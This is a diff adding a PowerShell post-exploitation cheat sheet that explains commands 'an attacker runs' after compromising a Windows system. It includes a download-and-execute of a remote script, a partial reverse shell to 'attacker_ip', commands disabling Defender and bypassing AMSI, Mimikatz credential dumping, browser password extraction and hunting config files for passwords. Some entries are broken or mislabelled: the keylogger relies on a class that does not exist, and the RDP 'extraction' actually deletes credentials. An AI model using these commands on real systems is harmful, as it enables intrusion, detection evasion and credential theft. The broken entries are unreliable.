@@ -1,0 +1,287 @@
+Powershell Concepts:
+How to check Powershell version: $PSversionTable
+Powershell cmdlet structure
+1-Verb= Verb is the action (Get, Set, New, etc)
+2-Noun=Its is the resource (Service, Process, etc)
+3-Prefix=used to group (AD, SP, Azure AD)
+
+Module: A module is a package that contains Powershell command such as cmdlets, providers, functions, workflows,variables and aliases. People who recieve modules can add the commands in the modules to their powershell sessions and use them just like the built-in commands.
+====================================================================
+Get - to get something
+Start - to run something
+Out - to output something
+Stop - To stop something that is running
+Set - To define something
+New - To create something
+========================================================================
+Execution Policy Bypass: powershell -ep bypass
+========================================================================
+Attacker runs below command after exploitation when he fingerprint the compromised system:
+
+Enumerating System Information: Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
+
+Get-WmiObject: This cmdlet is used to retrieve management information from local and remote systems using Windows Management Instrumentation (WMI).
+-Class Win32_OperatingSystem: Specifies that the information should be retrieved from the Win32_OperatingSystem WMI class, which contains properties related to the operating system.
+| (Pipeline Operator): Takes the output of the Get-WmiObject cmdlet and passes it as input to the next cmdlet.
+Select-Object:This cmdlet is used to select specific properties or objects from the output.
+-Property *: Selects all properties of the objects retrieved by Get-WmiObject. The * is a wildcard character that represents all properties.
+when you run this command, it queries the Win32_OperatingSystem class through WMI and retrieves information about the operating system. The output will include details such as the operating system version, build number, registered user, system directory, and other related information.
+==========================================================================
+
+Extracting Network Configuration: Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
+
+Get-NetIPConfiguration: This cmdlet is used to retrieve information about the IP configuration of network interfaces on a Windows computer. It provides details such as IP addresses, subnet masks, default gateways, and DNS servers.
+| (Pipeline Operator): Takes the output of the Get-NetIPConfiguration cmdlet and passes it as input to the next cmdlet.
+Select-Object:This cmdlet is used to select specific properties or objects from the output.
+-Property InterfaceAlias, IPv4Address, IPv6Address, DNServer: Specifies the properties to be selected and displayed in the output. In this case, it selects the InterfaceAlias, IPv4Address, IPv6Address, and DNServer properties.
+Selected Properties:
+InterfaceAlias: Represents the alias or name assigned to a network interface. It helps identify the specific network adapter.
+IPv4Address: Represents the IPv4 address assigned to the network interface.
+IPv6Address: Represents the IPv6 address assigned to the network interface.
+DNServer: Represents the DNS (Domain Name System) server(s) configured for the network interface.
+When you run this command, the output will include information about each network interface, displaying the selected properties for each. 
+==========================================================================
+
+Listing Running Processes with Details: Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
+
+When you run this command, the output will include information about running processes, showing the selected properties (ProcessName, Id, and CPU), and the list will be sorted based on CPU usage in descending order.
+==========================================================================
+
+Accessing Event Logs for Anomalies: Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
+Searches the Security event log for entries where the entry type is ‘FailureAudit’ , which can indicate securityrelated anomalies
+==========================================================================
+
+Scanning for Open Ports:
+
+1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async =
+$sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false);
+if($sock.Connected) { $_ } ; $sock.Close() }
+
+It is a simple port scanning script that iterates over a range of ports from 1 to 1024. For each port, it attempts to establish a TCP connection to the local machine ('localhost'). If the connection is successful within a timeout period of 100 milliseconds, it prints the port number as an open port.
+
+1..1024 | ForEach-Object { ... }:This part generates a range of numbers from 1 to 1024 and iterates over each number using the ForEach-Object cmdlet.
+
+$sock = New-Object System.Net.Sockets.TcpClient:Creates a new TCP client object ($sock) used for making TCP connections.
+
+$async = $sock.BeginConnect('localhost', $_, $null, $null):Initiates an asynchronous connection attempt to the specified port on the local machine ('localhost'). The port number is represented by the $_ variable, which is the current number in the iteration.
+
+$wait = $async.AsyncWaitHandle.WaitOne(100, $false):Waits for the asynchronous operation to complete or for the specified timeout (100 milliseconds in this case). If the connection is successful within the timeout, it sets $sock.Connected to true.
+
+if ($sock.Connected) { $_ }:Checks if the TCP client is connected. If it is, it prints the port number ($_) as an open port.
+
+$sock.Close():Closes the TCP client after the connection attempt.
+
+So, when you run this script, it will attempt to connect to ports 1 to 1024 on the local machine and print the numbers of the open ports. The purpose of such a script is often to identify open ports on a machine, which can be useful for network diagnostics or security assessments. 
+
+====================================================================================
+
+Retrieving Stored Credentials: $cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
+
+This PowerShell script involves creating a credential object using Get-Credential and then extracting the username and password from that credential using GetNetworkCredential().
+
+$cred = Get-Credential:
+
+This line prompts the user to enter a username and password, and it stores the resulting credential object in the variable $cred. The Get-Credential cmdlet is commonly used to securely prompt for and store credentials.
+$cred.GetNetworkCredential(): This method is used on the credential object to retrieve a NetworkCredential object. The NetworkCredential class is part of the System.Net namespace in .NET and is commonly used for handling network-based authentication.
+| Select-Object -Property UserName, Password: The Select-Object cmdlet is used to select and display specific properties from the output. In this case, it selects the UserName and Password properties from the NetworkCredential object.
+
+Prompts for user credentials and then displays the username and password, useful for credential harvesting.
+=====================================================================================
+
+Executing Remote Commands: Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)
+
+Executes a command remotely on a target PC, in this case, listing processes. Requires credentials for the target
+system.
+
+Invoke-Command: This cmdlet allows you to run commands on a local or remote computer.
+-ComputerName TargetPC: Specifies the name of the target computer (in this case, TargetPC) where the command will be executed.
+-ScriptBlock { Get-Process }: Defines the script block containing the command to be executed on the remote computer. In this case, it's Get-Process, which retrieves information about running processes on the remote machine.
+-Credential (Get-Credential): Uses the Get-Credential cmdlet to prompt the user for a username and password. The resulting credential object is then passed to the -Credential parameter, providing the necessary credentials for the remote connection.
+
+So, when you run this command, it will prompt you for credentials, and then it will connect to the remote computer (TargetPC) and execute the Get-Process command, returning information about the running processes on that remote machine.
+
+=========================================================================================
+Downloading and Executing Scripts from URL:
+
+$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object
+Net.WebClient).DownloadString($url)
+Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.
+
+$url = 'http://example.com/script.ps1': This line assigns the URL of the script (script.ps1) to the variable $url. In this case, the URL is set to http://example.com/script.ps1.
+Invoke-Expression: This cmdlet is used to evaluate and execute a PowerShell expression or script block.
+(New-Object Net.WebClient).DownloadString($url): This part of the script creates a new instance of System.Net.WebClient using New-Object. Then, it calls the DownloadString method of WebClient to download the content of the script located at the specified URL.
+Invoke-Expression (New-Object Net.WebClient).DownloadString($url): Combining the previous steps, this line invokes the downloaded script by passing its content to Invoke-Expression. The Invoke-Expression cmdlet then executes the downloaded script as if it were entered directly into the PowerShell console.
+
+This kind of script execution method can be useful but also poses security risks. Downloading and executing scripts from external sources should be done cautiously, as it may introduce potential security vulnerabilities, especially if the source of the script is untrusted.
+
+========================================================================================
+
+Bypassing Execution Policy for Script Execution:
+
+Set-ExecutionPolicy Bypass -Scope Process -Force; .\script.ps1
+
+Temporarily bypasses the script execution policy to run a PowerShell script, allowing execution of unsigned scripts.
+
+Set-ExecutionPolicy Bypass -Scope Process -Force: This line sets the execution policy for the current PowerShell process to "Bypass." The execution policy is a security feature in PowerShell that determines the conditions under which scripts can be run. Setting it to "Bypass" essentially allows the execution of scripts without any restrictions.
+
+-Scope Process: Specifies that the change is applied only to the current PowerShell session.
+
+-Force: Overrides any restrictions or prompts for confirmation.
+
+.\script.ps1: This line attempts to execute the script named script.ps1 in the current PowerShell session. The .\ is used to denote a script in the current directory.
+
+Please note that setting the execution policy to "Bypass" can introduce security risks, as it allows the execution of scripts without any restrictions. This should be done cautiously, and you should ensure that the script you are running is from a trusted 
+========================================================================================
+
+Enumerating Domain Users:
+
+Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate
+
+Retrieves a list of all domain users, including their names, account status, and last logon dates.
+
+Get-ADUser -Filter * -Properties *: Get-ADUser is a cmdlet used to retrieve Active Directory user accounts.
+-Filter *: Retrieves all user accounts by applying a filter that matches all objects.
+-Properties *: Specifies that all available properties of the user accounts should be retrieved. This can include attributes such as username, email, enabled status, and more.
+| (Pipeline Operator): Takes the output of the Get-ADUser cmdlet and passes it as input to the next cmdlet.
+Select-Object -Property Name, Enabled, LastLogonDate: Select-Object is used to choose specific properties from the output of the previous cmdlet.
+-Property Name, Enabled, LastLogonDate: Specifies the properties to be selected and displayed in the output. In this case, it selects the Name (username), Enabled (account status), and LastLogonDate properties.
+
+The resulting output will display information about Active Directory users, including their usernames (Name), account status (Enabled), and the last logon date (LastLogonDate).
+===========================================================================================
+
+Capturing Keystrokes:
+
+$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
+
+Captures and logs keystrokes to a file, which can be used for gathering sensitive information like passwords.
+
+$path = 'C:\temp\keystrokes.txt': Specifies the path where the keystrokes will be logged. In this case, it is set to C:\temp\keystrokes.txt.
+Add-Type -AssemblyName System.Windows.Forms: Adds the System.Windows.Forms assembly, which contains classes for building Windows-based applications.
+$listener = New-Object System.Windows.Forms.Keylogger: Creates a new instance of the Keylogger class from the System.Windows.Forms namespace. Note that the Keylogger class does not exist by default in the .NET Framework, and this part assumes that such a class has been defined elsewhere in your code or loaded from an external source.
+[System.Windows.Forms.Application]::Run($listener): Runs the Windows Forms application using the Keylogger object as the main form. This is typically used in Windows Forms applications to start the message loop.
+$listener.Keys | Out-File -FilePath $path: Writes the keystrokes captured by the $listener object to the specified file path ($path). The assumption here is that the Keys property of the Keylogger object contains the keystrokes.
+============================================================================================
+
+Monitoring File System Changes:
+
+$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
+
+Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.
+
+The PowerShell script, sets up a FileSystemWatcher to monitor the 'C:' directory and its subdirectories for file creation events. When a file is created, the script uses an event handler to write a message to the console.
+
+$watcher = New-Object System.IO.FileSystemWatcher: Creates a new instance of the FileSystemWatcher class, which is used to watch for changes in the file system.
+$watcher.Path = 'C:\': Sets the path that the FileSystemWatcher will monitor. In this case, it is set to the 'C:' directory.
+$watcher.IncludeSubdirectories = $true: Specifies that the FileSystemWatcher should also monitor subdirectories of the specified path.
+$watcher.EnableRaisingEvents = $true: Enables the FileSystemWatcher to start raising events when changes occur.
+Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }: Registers an event handler for the 'Created' event of the FileSystemWatcher.
+When a file is created in the monitored directory or its subdirectories, the specified action is executed. In this case, it writes a message to the console indicating the path of the created file.
+
+This script will continuously run and display messages in the console whenever a new file is created within the specified directory and its subdirectories.
+==================================================================================================
+
+Creating Reverse Shell:
+
+$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535...
+
+Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command execution.
+
+$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port): Creates a new TCP client object ($client) and attempts to establish a connection to a remote server with the specified IP address ('attacker_ip') and port number (attacker_port).
+$stream = $client.GetStream() Gets the network stream associated with the TCP client ($client). This stream is used for reading and writing data to the connected socket.
+[byte[]]$bytes = 0..65535...: Declares a byte array ($bytes) and initializes it with values from 0 to 65535. However, the ellipsis (...) at the end of the line indicates that the script is incomplete. The actual content of the byte array is missing.
+
+===================================================================================================
+
+Disabling Windows Defender: 
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+Disables Windows Defender’s real-time monitoring feature, which can help in evading detection.
+
+The Set-MpPreference cmdlet in PowerShell is used to configure preferences for Windows Defender (Microsoft Defender Antivirus). The specific command you provided, Set-MpPreference -DisableRealtimeMonitoring $true, disables real-time monitoring.
+
+Set-MpPreference: This cmdlet is used to configure Microsoft Defender Antivirus preferences.
+
+-DisableRealtimeMonitoring $true: This parameter sets the preference for real-time monitoring. By setting $true, it disables real-time monitoring. Real-time monitoring is a feature of antivirus software that actively scans files and processes in real-time to detect and prevent malware infections.
+
+So, the command is effectively turning off real-time monitoring for Microsoft Defender Antivirus.
+
+=====================================================================================================
+
+Extracting Browser Saved Passwords:
+
+Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt
+
+Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.
+
+====================================================================================================
+
+Bypassing AMSI (Anti-Malware Scan Interface):
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.
+
+The PowerShell command appears to be attempting to disable AMSI (Antimalware Scan Interface) by using reflection to access and modify a non-public static field within the System.Management.Automation.AmsiUtils class. AMSI is a security feature in Windows that allows applications and services to integrate with antivirus products for better threat detection.
+
+[Ref]: This likely refers to a variable or object with a loaded assembly.
+
+.Assembly.GetType('System.Management.Automation.AmsiUtils'): Gets the Type object for the System.Management.Automation.AmsiUtils class.
+
+.GetField('amsiInitFailed','NonPublic,Static'): Gets the FieldInfo object for the non-public and static field named amsiInitFailed within the AmsiUtils class.
+
+.SetValue($null,$true): Sets the value of the amsiInitFailed field to $true. $null is used as the target object since the field is static.
+
+This script appears to be attempting to set the amsiInitFailed field to $true, which could potentially bypass or disable AMSI.
+
+======================================================================================================
+
+Extracting System Secrets with Mimikatz:
+
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt
+
+Uses Mimikatz to extract logon passwords and other sensitive data from system memory.
+
+The PowerShell command you provided appears to be using the Mimikatz tool to perform credential dumping on a Windows system. Specifically, it's using the Invoke-Mimikatz script to execute the Mimikatz command sekurlsa::logonpasswords and then saving the results to a file named logonpasswords.txt at C:\temp\.
+
+Invoke-Mimikatz: This is a PowerShell script that facilitates the execution of Mimikatz commands from PowerShell. Mimikatz is a powerful post-exploitation tool that can be used to extract plaintext passwords, hashes, and other credentials from memory.
+
+-Command '"sekurlsa::logonpasswords"': This part of the command specifies the Mimikatz command to be executed. In this case, it's the sekurlsa::logonpasswords command, which extracts and displays logon passwords.
+
+| Out-File -FilePath C:\temp\logonpasswords.txt: This part of the command takes the output generated by Invoke-Mimikatz and pipes it to Out-File, saving the output to a text file named logonpasswords.txt in the C:\temp\ directory.
+
+=========================================================================================================
+
+Extracting Saved RDP Credentials:
+
+cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }
+
+Lists and deletes saved Remote Desktop Protocol (RDP) credentials, which can be used to access remote systems.
+
+The provided PowerShell command uses the cmdkey command-line utility to list stored credentials (using cmdkey /list). It then filters the results to find entries related to TERMSRV (Terminal Services, often used for Remote Desktop connections) and deletes those credentials.
+
+cmdkey /list: This command lists the stored credentials on the system using the cmdkey utility.
+Select-String 'Target: TERMSRV': This cmdlet filters the output of the cmdkey /list command to include only lines that contain the string 'Target: TERMSRV'. This narrows down the results to entries related to Terminal Services.
+ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }: For each line that contains 'Target: TERMSRV', this part of the command uses ForEach-Object to execute the cmdkey /delete command for the corresponding target.
+($_ -split ' ')[-1] is used to split the line into words and select the last word, which is assumed to be the target server. This target server is then passed to cmdkey /delete to delete the stored credential.
+
+=========================================================================================================
+
+Reading Credentials from Configuration Files:
+
+Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='
+
+Searches for strings containing ‘password=’ in all .config files on the C: drive, which can reveal hardcoded credentials.
+
+The PowerShell command you provided retrieves all files with a .config extension in the C:\ directory and its subdirectories using Get-ChildItem. Then, it uses Select-String to search for lines containing the pattern 'password=' within those files.
+
+Get-ChildItem -Path C:\ -Include *.config -Recurse: Get-ChildItem retrieves a list of files and directories in the specified path (C:\).
+-Include *.config: Filters the results to include only files with a .config extension.
+-Recurse: Recursively searches through subdirectories.
+| (Pipeline Operator): Takes the output of the Get-ChildItem cmdlet and passes it as input to the next cmdlet.
+Select-String -Pattern 'password=': Select-String searches for text patterns in the content of the files.
+-Pattern 'password=': Specifies the pattern to search for. In this case, it looks for lines containing the string 'password='.
+
+The purpose of this command is to identify and display lines in .config files that contain the string 'password='. This can be useful for searching configuration files for plaintext passwords. However, please note that searching for passwords in plaintext within configuration files raises security and privacy concerns.
+
+==============================================================================================================
